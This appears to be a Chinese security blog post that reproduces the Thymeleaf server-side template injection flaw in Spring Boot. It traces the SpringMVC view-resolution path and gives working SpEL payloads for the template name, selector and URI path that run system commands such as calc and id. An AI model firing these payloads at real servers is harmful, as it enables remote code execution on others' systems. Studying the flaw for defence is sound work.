    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>趁热打铁，昨天刚学完thymeleaf引擎今天直接上注入</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514</a></p><p><a href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p><p><a href="https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/</a></p><p><a href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a></p><span id="more"></span><p>以这个项目进行漏洞复现：<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p><p>环境jdk1.8 + springboot 2.2.0 +thymeleaf 3.0.11</p><hr><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h2><p>在<strong>Thymeleaf 3.x 版本</strong>后，新增了<code>~&#123;...&#125;</code>片段表达式，而出现SSTI问题的主要原因也在于此</p><p>复习一下语法：</p><p><code>~&#123;templatename::selector&#125;</code>**，会在<code>/WEB-INF/templates/</code>目录下寻找名为<code>templatename</code>的模版中定义的<code>fragment</code></p><p>如有一个 html 文件的代码如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>banquan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2021 ThreeDream yyds<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在另一template中可以通过片段表达式引用该片段：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>insert</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>~&#123;footer :: banquan&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>th:insert</code>和<code>th:replace</code>插入片段是比较常见的用法</p><ul><li><code>~&#123;templatename&#125;</code>**：引用整个<code>templatename</code>模版文件作为<code>fragment</code></li><li><code>~&#123;::selector&#125;</code> 或 <code>~&#123;this::selector&#125;</code>**：引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code>。在这里，<code>selector</code>可以是通过<code>th:fragment</code>定义的片段，也可以是类选择器、ID选择器等</li><li><strong>当<code>~&#123;&#125;</code>片段表达式中出现<code>::</code>，那么 <code>::</code>后需要有值（也就是<code>selector</code>）</strong></li></ul><p>Thymeleaf中的<strong>预处理表达式</strong>：<code>__$&#123;expression&#125;__</code>，因为预处理也可以解析执行表达式，也就是说找到一个可以控制预处理表达式的地方，让其解析执行我们的payload即可达到任意代码执行</p><br><p>现在切入正题</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710173131353.png" alt="image-20240710173131353"></p><p>看这里的&#x2F;path路由：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">   <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>乍一看只是一个语言选择的参数lang，但是这里采用的是 thymeleaf 模板，就出现了问题</p><blockquote><p>在springboot + thymeleaf 中，如果视图名可控，就会导致漏洞的产生。其主要原因就是在控制器中执行 return  后，Spring 会自动调度 Thymeleaf  引擎寻找并渲染模板，在寻找的过程中，会将传入的参数当成SpEL表达式执行，从而导致了远程代码执行漏洞。</p></blockquote><p>而这里的视图名，就是lang参数，当我们传入参数值en的时候，会正常渲染这里的en&#x2F;welcome.html</p><br><p>接下来跟一下这个视图解析的过程，其实大部分都是MVC对request的处理流程，在MVC中是DispatcherServlet拦截请求并分发到Handler处理</p><h2 id="SpringMVC-视图解析过程分析"><a href="#SpringMVC-视图解析过程分析" class="headerlink" title="SpringMVC 视图解析过程分析"></a>SpringMVC 视图解析过程分析</h2><p>下断点直接定位到<code>DispatcherServlet#doDispatch</code>方法（所有的request和response都会经过该方法）</p><p>开始调试，传入<code>/path?lang=en</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710181149064.png" alt="image-20240710181149064"></p><p>首先获取到了Handler消息处理，之后进入<code>doDispatch</code>方法的实现，这里重点注意下下面3个方法</p><ul><li><p><code>ha.handle()</code> ，获取ModelAndView也就是Controller中的return值</p></li><li><p><code>applyDefaultViewName()</code>，对当前ModelAndView做判断，如果为null则进入defalutViewName部分处理，将URI path作为mav的值</p></li><li><p><code>processDispatchResult()</code>，处理视图并<strong>解析执行表达式</strong>以及抛出异常回显部分处理</p></li></ul><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710181729565.png" alt="image-20240710181729565"></p><h3 id="封装ModelAndView对象"><a href="#封装ModelAndView对象" class="headerlink" title="封装ModelAndView对象"></a>封装ModelAndView对象</h3><p>先跟进到<code>ha.handle()</code></p><p>调用了&#x2F;org&#x2F;springframework&#x2F;web&#x2F;servlet&#x2F;mvc&#x2F;method&#x2F;AbstractHandlerMethodAdapter.class#handleInternal</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182306729.png" alt="image-20240710182306729"></p><p>然后继续跟，一路来到调用<code>invokeHandlerMethod</code>方法，这里就是使用Handler处理request并获取ModelAndView</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182557297.png" alt="image-20240710182557297"></p><p>跟进<code>invokeHandlerMethod</code>到调用<code>invokeAndHandle</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182924461.png" alt="image-20240710182924461"></p><p>跟进<code>invokeAndHandle</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710183221338.png" alt="image-20240710183221338"></p><p>可以看到这里做了如下操作：</p><ul><li><p><code>invokeForRequest</code>会调用Controller后获取返回值到<code>returnValue</code>中</p><p>这里的controller是HelloController.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断<code>returnValue</code>是否为空，如果是则继续判断<code>isRequestHandled</code>是否为<code>True</code>，都满足的话设置<code>requestHandled</code>为<code>true</code></p></li><li><p>通过<code>handleReturnValue</code>根据返回值的类型和返回值将不同的属性设置到<code>ModelAndViewContainer</code>中</p></li></ul><p>总结一下，就是根据用户输入的url，调用相关的controller，并将其返回值<code>returnValue</code>，作为待查找的模板文件名，然后通过Thymeleaf模板引擎去查找，并返回给用户</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710183847319.png" alt="image-20240710183847319"></p><p>可以看到经过了<code>invokeForRequest</code>处理后return的字符串和前后缀拼接在了一起，然后在templates目录下寻找模板文件，这里找的就是<code>templates/user/en/welcome.html</code></p><p>接下来跟到<code>handleReturnValue</code>方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleReturnValue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> returnValue<span class="token punctuation">,</span> <span class="token class-name">MethodParameter</span> returnType<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span> <span class="token class-name">NativeWebRequest</span> webRequest<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>       <span class="token comment">//获取handler</span>       <span class="token class-name">HandlerMethodReturnValueHandler</span> handler <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">selectHandler</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>handler <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Unknown return value type: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>           <span class="token comment">//执行handleReturnValue操作</span>           handler<span class="token punctuation">.</span><span class="token function">handleReturnValue</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进<code>ViewNameMethodReturnValueHandler#handleReturnValue</code>：</p><ul><li>判断返回值类型是否为字符型，设置<code>mavContainer.viewName</code></li><li>判断返回值是否以<code>redirect:</code>开头，如果是的话则设置重定向的属性</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleReturnValue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> returnValue<span class="token punctuation">,</span> <span class="token class-name">MethodParameter</span> returnType<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span> <span class="token class-name">NativeWebRequest</span> webRequest<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token keyword">instanceof</span> <span class="token class-name">CharSequence</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">String</span> viewName <span class="token operator">=</span> returnValue<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//设置返回值为viewName</span>           mavContainer<span class="token punctuation">.</span><span class="token function">setViewName</span><span class="token punctuation">(</span>viewName<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//判断是否需要重定向</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isRedirectViewName</span><span class="token punctuation">(</span>viewName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               mavContainer<span class="token punctuation">.</span><span class="token function">setRedirectModelScenario</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnsupportedOperationException</span><span class="token punctuation">(</span><span class="token string">"Unexpected return type: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" in method: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上面的操作，将返回值设置为<code>mavContainer.viewName</code></p><p>执行上述操作后返回到<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>中。通过<code>getModelAndView</code>获取<code>ModelAndView</code>对象</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710185654740.png" alt="image-20240710185654740"></p><p><code>getModelAndView</code>根据<code>viewName</code>和<code>model</code>创建<code>ModelAndView</code>对象并返回</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710185924354.png" alt="image-20240710185924354"></p><br><p>接下来跟进到<code>applyDefaultViewName</code>方法</p><p>如果 ModelAndView 值不为null则什么也不做，否则如果<code>defaultViewName</code>存在值则会给 ModelAndView 赋值为 defaultViewName，也就是将 URI path 作为视图名称</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193340699.png" alt="image-20240710193340699"></p><hr><h3 id="获取视图"><a href="#获取视图" class="headerlink" title="获取视图"></a>获取视图</h3><p>接下来跟进到<code>processDispatchResult</code>，获取到<code>ModelAndView</code>值后会进入到<code>processDispatchResult</code>方法</p><p>第1个if会被跳过，跟进第2个if中的<code>render</code>方法</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193725373.png" alt="image-20240710193725373"></p><p>在<code>render</code>方法中，首先会调用<code>getViewName</code>来获取mv对象的<code>viewName</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193923360.png" alt="image-20240710193923360"></p><p>然后调用<code>resolveViewName</code>方法</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710194219967.png" alt="image-20240710194219967"></p><p>循环遍历所有视图解析器解析视图，解析成功则返回，可以看到右下角这里有5个视图解析器</p><p>本以为会在<code>ThymeleafViewResolver</code>中获取视图，实际调试发现这里在<code>ContentNegotiatingViewResolver</code>中就已经获取到了视图</p><blockquote><p><code>ContentNegotiatingViewResolver</code>视图解析器允许使用同样的数据获取不同的View，支持三种方式：</p></blockquote><ol><li><p>使用扩展名：</p><p><a href="http://localhost:8080/employees/nego/Jack.xml">http://localhost:8080/employees/nego/Jack.xml</a><br>返回结果为XML<br><a href="http://localhost:8080/employees/nego/Jack.json">http://localhost:8080/employees/nego/Jack.json</a><br>返回结果为JSON<br><a href="http://localhost:8080/employees/nego/Jack">http://localhost:8080/employees/nego/Jack</a><br>使用默认view呈现，比如JSP</p></li><li><p>HTTP Request Header中的Accept：Accept 分别是<code>text/jsp</code>，<code>text/pdf</code>，<code>text/xml</code>，<code>text/json</code>和<code>无Accept请求头</code></p></li><li><p>使用参数：</p><p><a href="http://localhost:8080/employees/nego/Jack?format=xml">http://localhost:8080/employees/nego/Jack?format=xml</a><br>返回结果为XML<br><a href="http://localhost:8080/employees/nego/Jack?format=json">http://localhost:8080/employees/nego/Jack?format=json</a><br>返回结果为JSON</p></li></ol><p>接下来跟进到<code>ContentNegotiatingViewResolver#resolveViewName</code>方法</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195200924.png" alt="image-20240710195200924"></p><p><code>getCandidateViews</code>循环调用所有的ViewResolver解析视图，解析成功放到视图列表中返回。同样也会根据Accept头得到后缀并通过ViewResolver解析视图</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195405092.png" alt="image-20240710195405092"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195451593.png" alt="image-20240710195451593"></p><br><p>接下来进入<code>getBestView</code>，根据Accept头获取最优的视图返回</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195808153.png" alt="image-20240710195808153"></p><p>最终返回的是<code>ThymeleafView</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200007899.png" alt="image-20240710200007899"></p><hr><h3 id="视图渲染"><a href="#视图渲染" class="headerlink" title="视图渲染"></a>视图渲染</h3><p>下一步是调用<code>render</code>方法</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200308152.png" alt="image-20240710200308152"></p><p>进入<code>ThymleafView#render</code>，接下来就是调用<code>renderFragment</code>**，这里就是漏洞触发的关键点之一了</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200453736.png" alt="image-20240710200453736"></p><p>该方法在后面首先判断<code>viewTemplateName</code>是否包含<code>::</code>，若包含则获取解析器</p><p>然后调用<code>parseExpression</code>方法将<code>viewTemplateName</code>（也就是Controller中最后return的值)构造成片段表达式<code>~&#123;&#125;</code>）并解析执行</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200843665.png" alt="image-20240710200843665"></p><p>因为我们这边的 viewTemplateName 为 user&#x2F;en&#x2F;welcome，所以不会进入<code>parseExpression</code></p><hr><h2 id="回显原理"><a href="#回显原理" class="headerlink" title="回显原理"></a>回显原理</h2><p>这种回显的本质其实是 <strong>throw 某个会包含表达式执行结果的异常</strong>，而在低版本的 springboot (&lt;&#x3D; 2.2) 中, <code>server.error.include-message</code> 的默认值为 <code>always</code>，这使得默认的 500 页面会显示异常信息</p><p>但是在高版本的 springboot (&gt;&#x3D; 2.3) 中, 上述选项的默认值变成了 <code>never</code>, 那么 500 页面就不会显示任何异常信息，所以这种回显形式还是会有一定的局限性</p><hr><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="templatename"><a href="#templatename" class="headerlink" title="templatename"></a>templatename</h2><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>打入payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token operator">?</span>lang<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token punctuation">.</span>exe<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PS：因为这里最后return的值为<code>user/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x/welcome</code>，无论我们payload如何构造最后都会拼接<code>/welcome</code>，所以根据前面分析即使不加<code>.x</code>依然可以触发命令执行</p><p>然后继续前面的分析，这样就进入了<code>parseExpression</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710201426798.png" alt="image-20240710201426798"></p><p>在<code>StandardExpressionParser#parseExpression</code>中</p><p>通过<code>preprocess</code>进行预处理，预处理根据该正则<code>\\_\\_(.*?)\\_\\_</code>提取<code>__xx__</code>间的内容</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202246428.png" alt="image-20240710202246428"></p><p>获取<code>expression</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202506931.png" alt="image-20240710202506931"></p><p>可以看到这里返回的expression已经是一个SPEL表达式了</p><p>最终调用<code>execute</code>方法，执行表达式</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202537749.png" alt="image-20240710202537749"></p><p>于是就弹出计算器了，同时抛出错误</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202804970.png" alt="image-20240710202804970"></p><p>所以这个漏洞的本质是<strong>SPEL表达式执行</strong></p><hr><h2 id="selector"><a href="#selector" class="headerlink" title="selector"></a>selector</h2><p>对于<code>~&#123;templatename::selector&#125;</code>，因为前面是在templatename的位置注入表达式，那么我们同样也可以在selector处进行注入</p><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/fragment"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">fragment</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> section<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"welcome :: "</span> <span class="token operator">+</span> section<span class="token punctuation">;</span> <span class="token comment">//fragment is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>fragment<span class="token operator">?</span>section<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实这里也可以不需要<code>.x</code>和<code>::</code>也可触发命令执行</p><p>值得注意的是，templatename和selector这两个地方的注入点不同会导致有无回显的差别，即最后抛出异常，templatename是存在结果回显的而找不到selector不存在结果回显</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710204032791.png" alt="image-20240710204032791"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710204046819.png" alt="image-20240710204046819"></p><p>原因是最终抛出 <code>TemplateInputException</code> 异常的时候携带的是 template，也就是 <code>::</code> 前面的内容，并没有带出 selector，详情看下面的回显分析</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710205345656.png" alt="image-20240710205345656"></p><hr><h2 id="URI-path"><a href="#URI-path" class="headerlink" title="URI path"></a>URI path</h2><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//returns void, so view name is taken from URI</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前面提过，在<code>applyDefaultViewName</code>方法处对当前ModelAndView做判断，如果为null则进入defalutViewName部分处理，将URI path作为mav的值即作为视图名称</p><p>所以我们直接在<code>&#123;document&#125;</code>位置传入payload，能直接弹计算器</p><p>但是当我们尝试执行 whoami 时，并没有产生回显，而是原封不动输出了我们的payload</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710211509566.png" alt="image-20240710211509566"></p><p>这是因为这个controller没有返回值，也不能有返回值，否则就不会调用<code>applyDefaultViewName</code>设置，如果我们的controller改成下面这样，将不会导致代码执行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"welcome"</span><span class="token 